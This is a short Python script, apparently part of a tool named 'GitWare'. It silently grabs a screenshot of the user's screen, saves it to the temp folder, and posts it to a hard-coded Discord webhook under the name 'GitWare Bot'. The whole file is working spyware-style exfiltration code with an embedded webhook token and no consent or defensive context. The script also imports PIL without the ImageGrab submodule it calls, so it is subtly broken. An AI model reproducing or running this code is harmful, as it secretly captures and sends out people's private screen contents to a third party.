import requests
import io
import os
import PIL

webhook_url="https://discord.com/api/webhooks/1463550423532306635/axb803n3IuP1d5Zr54EGHvfuemrph5VhKXTWBKMk-LhUps4aNI2AMKt-ukIS1v7XFeKp"
screenshot=PIL.ImageGrab.grab()
temp_path=os.path.join(os.getenv("TEMP") or os.getenv("TMP") or ".", "screenshot.png")
screenshot.save(temp_path,format="PNG")
with open(temp_path,"rb") as f:
    files={"file":("screenshot.png",f,"image/png")}
    data={"content":"Here’s the latest screenshot","username":"GitWare Bot", "avatar":"https://github.com/orkkz/GitWare/blob/main/resources/gitware_symbol.png?raw=true"}
    requests.post(webhook_url,data=data,files=files)
